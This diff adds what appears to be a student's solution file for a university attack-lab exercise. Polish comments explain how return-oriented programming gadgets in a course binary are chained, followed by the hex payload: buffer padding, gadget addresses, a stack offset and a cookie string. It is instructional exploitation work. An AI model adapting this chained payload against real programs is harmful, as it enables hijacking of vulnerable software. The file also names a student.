@@ -1,0 +1,55 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Cezary Świtała, 316746
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+/* Przydatne obserwacje:
+    * Dodawanie dwóch 64-bitowych liczb mamy za darmo dzięki procedurze add_xy
+
+                   <add_xy>:
+                   401ddd:	lea(%rdi,%rsi,1),%rax
+                   401de1:	c3
+
+      Możemy spróbować dodać tym wskaźnik na szczyt stosu w którymś momencie i
+      odległość od niego do wpisanej przez nas reprezentacji ciasteczka.
+
+    * Wynik tego dodawania możemy przenieść do %rdi dzięki gadżetowi
+                   401da4:   mov %rax, %rdi
+
+    * Kolejny gadżet pomoże nam przenieść wartość %rsp -> %rax -> %rdi (korzystając
+      też z poprzedniego)
+                   401dec:   mov %rsp, %rax
+
+    * Różnicę możemy wpisać na sztywno na stos, następnie ściągnąć gadżetem
+                   401dcb:   pop %rax
+
+    * Nie możemy bezpośrednio przenieść %eax do %esi, dlatego potrzebne będą aż
+      trzy gadżety, żeby utworzyć ścieżkę %eax -> %ecx -> %edx -> %esi:
+                   401e44:   mov %eax, %ecx
+                   401df8:   mov %ecx, %edx
+                   401e0c:   mov %edx, %esi
+
+*/
+
+
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+01 02 03 04 05 06 07 08 /* wypełnienie bufora */
+CB 1D 40 00 00 00 00 00 /* skok do pop %rax */
+20 00 00 00 00 00 00 00 /* różnica między rsp, w miejsu, w którym
+                           zostanie pobrane, a początkiem stringa */
+44 1E 40 00 00 00 00 00 /* skok do mov %eax, %ecx */
+F8 1D 40 00 00 00 00 00 /* skok do mov %ecx, %edx */
+0C 1E 40 00 00 00 00 00 /* skok do mov %edx, %esi */
+EC 1D 40 00 00 00 00 00 /* skok do mov %rsp, %rax */
+A4 1D 40 00 00 00 00 00 /* skok do mov %rax, %rdi */
+DD 1D 40 00 00 00 00 00 /* skok do add_xy */
+A4 1D 40 00 00 00 00 00 /* skok do mov %rax, %rdi */
+0E 1D 40 00 00 00 00 00 /* skok do touch3 */
+36 31 36 38 34 37 36 62 00 /* reprezentacja ciasteczka w ascii */
